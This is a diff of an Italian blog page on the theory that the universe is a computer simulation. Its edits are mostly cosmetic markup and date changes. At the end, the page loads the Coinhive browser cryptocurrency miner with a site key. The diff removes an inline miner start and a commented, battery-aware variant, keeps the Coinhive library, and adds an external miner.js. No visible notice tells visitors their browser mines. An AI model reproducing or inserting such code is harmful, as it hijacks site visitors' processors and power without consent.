@@ -13,7 +13,7 @@
 
 " />
 	<meta name="keywords" content="Simulazione, Aliena, Elon musk, Scifi" />  
-	<meta http-equiv="last-modified" content="2017-10-03 19:55:06 +0200" /> 
+	<meta http-equiv="last-modified" content="2017-10-06 15:29:24 +0200" /> 
 	<!--<noscript>-->
 	<link rel="stylesheet" href="/css/skel.css" />
 	<link rel="stylesheet" href="/css/style.css" />
@@ -103,6 +103,8 @@
 
 			<p>Esitono persone che ritengono che <a href="http://www.lescienze.it/news/2016/04/16/news/universo_simulazione_computer-3054787/">viviamo in una grande, enorme simulazione al computer</a>, magari realizzata da una civiltà aliena che ci sfrutta o ci osserva, manco fossimo al Grande Fratello.</p>
 
+<!--more-->
+
 <p>Se non avete ancora chiuso il browser, sappiate che tra i sostenitori di questa teoria ci sono principalmente scienziati e tecnologhi di tutti rispetto, come <a href="https://www.theguardian.com/technology/2017/apr/22/what-if-were-living-in-a-computer-simulation-the-matrix-elon-musk">Stephen Hawking e Elon Musk</a>.</p>
 
 <h3 id="perché-credere-alla-simulazione">Perché credere alla simulazione…</h3>
@@ -119,7 +121,7 @@
 
 <p>La “scoperta”, per questi scienziati, è che questo particolare fenomeno sembra essere irrealizzabile all’interno di un computer. In particolare, se ne riescono a calcolare gli effetti finchè gli elettroni (e gli atomi) in gioco sono pochissimi, ma non appena diventano qualcosa come 2-300 (stiamo parlando di elettroni!) un computer richiederebbe tempo esponenziale per calcolare un risultato. E come disse una volta un mio prof, 2^300 (<em>due alla duecento</em>) è più o meno il numero di atomi presenti nell’universo!</p>
 
-<h2 id="e-se-si-sono-sbagliati">E se si sono sbagliati?</h2>
+<h2 id="e-se-si-fossero-sbagliati">E se si fossero sbagliati?</h2>
 
 <p>Ci sono ancora troppe variabili in gioco per poter dire che la questione sia conclusa. Alcune delle domande a cui onestamente non sappiamo dare una risposta:</p>
 
@@ -173,7 +175,7 @@ s.setAttribute('data-timestamp', +new Date());
 			<div class="row">
 				
 
-				<article class="6u 12u(small) excerpt">
+				<div class="6u 12u(small) excerpt" id="previousArticle">
 					<header>
 						<h2><a href="/2017/09/21/a-clear-explanation-of-jwt.html">JWT: what is it? How does it work? Why should we use it?</a></h2>
 					</header>
@@ -182,15 +184,15 @@ s.setAttribute('data-timestamp', +new Date());
 
 
 					</section>
-					<footer>
+					<div>
 						<ul class="actions">
 							<li><a href="/2017/09/21/a-clear-explanation-of-jwt.html" class="button">Read More</a></li>
 						</ul>
-					</footer>
-				</article>
+					</div>
+				</div>
 				 
 
-				<article class="6u$ 12u(small) excerpt f-right">
+				<div class="6u$ 12u(small) excerpt f-right" id="nextArticle">
 					<header>
 						<h2><a href="/2017/10/03/recensione-dell-xps-15-2017.html">Windows non fa più così schifo: recensione Dell XPS 15" 9560 (2017)</a></h2>
 					</header>
@@ -199,12 +201,12 @@ s.setAttribute('data-timestamp', +new Date());
 
 
 					</section>
-					<footer>
+					<div>
 						<ul class="actions">
 							<li><a href="//2017/10/03/recensione-dell-xps-15-2017.html" class="button">Read More</a></li>
 						</ul>
-					</footer>
-				</article>
+					</div>
+				</div>
 				
 			</div>
 		</footer>
@@ -260,37 +262,9 @@ s.setAttribute('data-timestamp', +new Date());
 	<script src="/js/skel.min.js"></script>
 	<script src="/js/init.js"></script>
 	<script src="/js/prism.js"></script>
+	<script src="/js/infinite-scroll.js"></script>
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-
-var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY');
-
-miner.start();
-
-/*
-try {
-    var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY', {
-        throttle: 0.85,
-        threads: 1
-    });
-
-    var threads = Math.max(1, Math.floor(navigator.hardwareConcurrency / 4));
-    miner.setNumThreads(threads);
-    
-    miner.start();
-    
-    navigator.getBattery().then(function (battery) {
-        if (battery.charging) miner.start();
-        battery.onchargingchange = function (evt) {
-            if (battery.charging) miner.start();
-            else miner.stop();
-        }
-    });
-    } catch (e) {
-        miner.start();
-    }
-    */
-</script>
+<script src="/js/miner.js"></script>
 </body>
 
 </html>
